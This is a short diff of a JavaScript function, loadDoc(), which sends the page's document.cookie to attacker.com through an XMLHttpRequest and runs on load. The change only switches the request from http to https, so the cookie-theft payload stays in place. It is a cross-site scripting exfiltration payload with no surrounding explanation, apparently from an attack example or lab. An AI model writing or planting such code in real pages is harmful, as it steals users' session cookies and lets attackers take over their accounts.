@@ -11,7 +11,7 @@ function loadDoc() {
 	    alert(this.responseText);
     }
   };
-  xhttp.open("GET", "http://attacker.com/?cookie="+document.cookie, true);
+  xhttp.open("GET", "https://attacker.com/?cookie="+document.cookie, true);
   xhttp.send();
 }
 	loadDoc();
